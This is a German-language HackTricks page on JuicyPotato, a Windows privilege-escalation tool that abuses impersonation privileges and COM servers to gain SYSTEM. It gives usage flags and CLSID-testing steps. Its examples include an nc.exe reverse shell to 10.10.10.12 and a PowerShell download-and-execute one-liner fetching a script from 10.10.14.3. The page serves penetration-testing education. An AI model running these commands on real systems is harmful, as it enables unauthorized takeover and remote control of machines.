# JuicyPotato

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato funktioniert nicht** auf Windows Server 2019 und Windows 10 Build 1809 und höher. Allerdings können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) verwendet werden, um **die gleichen Berechtigungen zu nutzen und Zugriff auf `NT AUTHORITY\SYSTEM`** zu erhalten. _**Überprüfe:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (Ausnutzung der goldenen Berechtigungen) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Eine gesüßte Version von_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, mit ein wenig Saft, d.h. **ein weiteres Tool zur lokalen Privilegieneskalation, von Windows-Dienstkonten zu NT AUTHORITY\SYSTEM**_

#### Du kannst juicypotato von [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) herunterladen

### Zusammenfassung <a href="#summary" id="summary"></a>

[**Aus dem juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) und seine [Varianten](https://github.com/decoder-it/lonelypotato) nutzen die Privilegieneskalationskette basierend auf [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [Dienst](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), der den MiTM-Listener auf `127.0.0.1:6666` hat und wenn du `SeImpersonate` oder `SeAssignPrimaryToken` Berechtigungen hast. Während einer Überprüfung des Windows-Builds fanden wir eine Konfiguration, bei der `BITS` absichtlich deaktiviert war und der Port `6666` belegt war.

Wir beschlossen, [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) zu waffen: **Sag Hallo zu Juicy Potato**.

> Für die Theorie siehe [Rotten Potato - Privilegieneskalation von Dienstkonten zu SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) und folge der Kette von Links und Referenzen.

Wir entdeckten, dass es neben `BITS` mehrere COM-Server gibt, die wir ausnutzen können. Sie müssen nur:

1. vom aktuellen Benutzer instanziierbar sein, normalerweise ein „Dienstbenutzer“, der über Impersonationsberechtigungen verfügt
2. das `IMarshal`-Interface implementieren
3. als ein erhöhter Benutzer (SYSTEM, Administrator, …) ausgeführt werden

Nach einigen Tests erhielten und testeten wir eine umfangreiche Liste von [interessanten CLSID’s](http://ohpe.it/juicy-potato/CLSID/) auf mehreren Windows-Versionen.

### Saftige Details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ermöglicht dir:

* **Ziel-CLSID** _wähle jede CLSID, die du möchtest._ [_Hier_](http://ohpe.it/juicy-potato/CLSID/) _findest du die Liste, die nach OS organisiert ist._
* **COM-Listening-Port** _definiere den COM-Listening-Port, den du bevorzugst (anstatt des fest codierten 6666)_
* **COM-Listening-IP-Adresse** _binde den Server an jede IP_
* **Prozess-Erstellungsmodus** _je nach den Berechtigungen des impersonierten Benutzers kannst du wählen zwischen:_
* `CreateProcessWithToken` (benötigt `SeImpersonate`)
* `CreateProcessAsUser` (benötigt `SeAssignPrimaryToken`)
* `beide`
* **Prozess zum Starten** _starte eine ausführbare Datei oder ein Skript, wenn die Ausnutzung erfolgreich ist_
* **Prozessargument** _passe die Argumente des gestarteten Prozesses an_
* **RPC-Serveradresse** _für einen stealthy Ansatz kannst du dich bei einem externen RPC-Server authentifizieren_
* **RPC-Serverport** _nützlich, wenn du dich bei einem externen Server authentifizieren möchtest und die Firewall den Port `135` blockiert…_
* **TEST-Modus** _hauptsächlich für Testzwecke, d.h. zum Testen von CLSIDs. Es erstellt das DCOM und druckt den Benutzer des Tokens. Siehe_ [_hier für Tests_](http://ohpe.it/juicy-potato/Test/)

### Verwendung <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**Aus juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Wenn der Benutzer die Berechtigungen `SeImpersonate` oder `SeAssignPrimaryToken` hat, dann sind Sie **SYSTEM**.

Es ist nahezu unmöglich, den Missbrauch all dieser COM-Server zu verhindern. Sie könnten darüber nachdenken, die Berechtigungen dieser Objekte über `DCOMCNFG` zu ändern, aber viel Glück, das wird herausfordernd sein.

Die eigentliche Lösung besteht darin, sensible Konten und Anwendungen zu schützen, die unter den `* SERVICE`-Konten ausgeführt werden. Das Stoppen von `DCOM` würde dieses Exploit sicherlich verhindern, könnte jedoch erhebliche Auswirkungen auf das zugrunde liegende Betriebssystem haben.

Von: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Beispiele

Hinweis: Besuchen Sie [diese Seite](https://ohpe.it/juicy-potato/CLSID/), um eine Liste von CLSIDs auszuprobieren.

### Erhalten Sie eine nc.exe Reverse-Shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Starte ein neues CMD (wenn du RDP-Zugriff hast)

![](<../../.gitbook/assets/image (300).png>)

## CLSID-Probleme

Oft funktioniert die standardmäßige CLSID, die JuicyPotato verwendet, **nicht** und der Exploit schlägt fehl. In der Regel sind mehrere Versuche erforderlich, um eine **funktionierende CLSID** zu finden. Um eine Liste von CLSIDs für ein bestimmtes Betriebssystem zu erhalten, solltest du diese Seite besuchen:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Überprüfen von CLSIDs**

Zuerst benötigst du einige ausführbare Dateien neben juicypotato.exe.

Lade [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) herunter und lade es in deine PS-Sitzung, und lade [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) herunter und führe es aus. Dieses Skript erstellt eine Liste möglicher CLSIDs, die getestet werden können.

Lade dann [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) herunter (ändere den Pfad zur CLSID-Liste und zur juicypotato-executablen Datei) und führe es aus. Es wird versuchen, jede CLSID zu testen, und **wenn sich die Portnummer ändert, bedeutet das, dass die CLSID funktioniert hat**.

**Überprüfe** die funktionierenden CLSIDs **mit dem Parameter -c**

## Referenzen

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
